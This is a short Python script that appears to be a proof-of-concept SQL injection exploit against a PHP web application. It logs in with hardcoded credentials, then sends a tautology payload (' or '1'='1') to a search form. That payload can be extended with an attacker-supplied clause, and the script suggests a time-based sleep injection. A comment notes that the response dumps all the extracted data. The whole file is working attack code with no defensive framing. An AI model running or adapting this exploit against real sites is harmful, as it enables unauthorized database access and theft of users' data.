import sys
import requests
from urllib import parse

host = f'http://{sys.argv[1]}:{sys.argv[2]}'

url_login = f"{host}/user/login.php"
url_search = f"{host}/user/search.php"

cmd = ''  # Maybe try '(select 1 from (select(sleep(5)))a)'?
if len(sys.argv) > 3:
    cmd = 'or ' + sys.argv[3]

data_login = { 
    'mobno': '1234567890',
    'password': 'Test@123',
    'login': '',
}

data_search = {
        'searchdata': f"' or '1'='1' {cmd}; #",
        'search': '',
}

s = requests.session()
s.post(url_login, data=data_login)
resp = s.post(url_search, data=data_search)
# print(resp.text)  # Dump all the extracted data
print("Check the db status to see if this works ...")
